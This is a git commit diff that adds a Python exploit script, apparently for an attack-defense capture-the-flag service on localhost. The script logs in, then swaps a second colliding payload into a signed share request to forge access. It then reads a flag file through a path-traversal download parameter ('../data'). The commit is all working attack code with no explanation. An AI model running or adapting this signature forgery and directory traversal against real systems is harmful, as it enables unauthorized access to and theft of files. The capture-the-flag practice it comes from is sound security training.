b89b333a78e4330606eb09cd34c007ba0367b3e3
Konstantin Plotnikov <kostteg@gmail.com>
2021-12-08 05:23:43 +0500

    [fs] sploit

--- sploits/fs/sploit.py
+++ sploits/fs/sploit.py
@@ -1,4 +1,25 @@
+import requests
+import re
 import base64
+
+public_flag_id = "/Fulawans/wANiZAte/suppLaRT.d3r" # PUT here your public flag id
+
+s = requests.session()
+result = s.post("http://127.0.0.1:7777/login", data={"username": "kost", "password": "kost"})
+with open("collision1.bin.request", "rb") as f:
+    collision1 = f.read()
+a_tag = s.post("http://127.0.0.1:7777/share", data=collision1).text
+
 with open("collision2.bin.request", "rb") as f:
-	data = f.read()
-print(base64.urlsafe_b64encode(data))
+    collision2 = f.read()
+payload = base64.urlsafe_b64encode(collision2).decode('utf-8')
+hacked_a_tag = re.sub(r"\?request\=.*?\&signature=", f"?request={payload}&signature=", a_tag)
+
+m = re.search(r"href=\"(/access\?request=.*?)\">click here to get access", hacked_a_tag)
+hacked_url = m.group(1)
+
+granted_message = s.get(f"http://127.0.0.1:7777{hacked_url}").text
+
+content = s.get(f"http://127.0.0.1:7777/download?file=../data{public_flag_id}").text
+flag = re.findall(r"\w{31}=", content)
+print("FLAG:", flag)
